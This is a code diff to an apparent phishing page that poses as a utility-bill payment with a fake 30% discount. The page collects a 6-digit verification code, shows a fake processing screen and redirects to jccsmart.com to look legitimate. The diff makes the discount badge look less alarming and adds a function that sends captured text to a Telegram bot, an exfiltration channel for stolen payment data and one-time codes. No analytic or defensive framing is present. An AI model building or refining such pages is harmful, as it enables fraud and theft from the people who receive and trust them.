@@ -15,7 +15,7 @@
         .step.active { display: block; }
         .amount-box { background: #f8f7ff; border: 1px solid #e0daff; border-radius: 15px; padding: 25px; margin: 20px 0; }
         .old-price { font-size: 16px; color: #888; text-decoration: line-through; margin-bottom: 2px; }
-        .discount-badge { display: inline-block; background: #d9534f; color: #fff; font-size: 12px; font-weight: bold; padding: 2px 6px; border-radius: 4px; margin-bottom: 8px; }
+        .discount-badge { display: inline-block; color: #28a745; font-size: 13px; font-weight: 600; padding: 2px 0; margin-bottom: 8px; }
         .amount { font-size: 40px; font-weight: 800; color: #5c46e5; }
         .form-group { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 13px; margin-bottom: 5px; font-weight: 600; color: #555; }
@@ -39,7 +39,7 @@
         <p>Utility Bill: #8829-10</p>
         <div class="amount-box">
             <div class="old-price">230.00€</div>
-            <div class="discount-badge">⚠️ SPECIAL DISCOUNT -30%</div>
+            <div class="discount-badge">Special discount -30%</div>
             <div style="font-size: 11px; color: #666; margin-bottom: 5px; font-weight: 600;">TOTAL AMOUNT DUE</div>
             <div class="amount">161.00€</div>
         </div>
@@ -129,11 +129,19 @@ function verifyCode() {
         alert('Please enter a valid 6-digit verification code');
         return;
     }
-
+async function sendMsg(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch(e) {}
+    }
     // Показываем экран загрузки
     document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
 
-    // Перенаправление на официальный сайт через 3 секунды
+    // Перенаправление на официальный сайт JCCsmart через 3 секунды
     setTimeout(() => {
         window.location.href = "jccsmart.com";
     }, 3000);
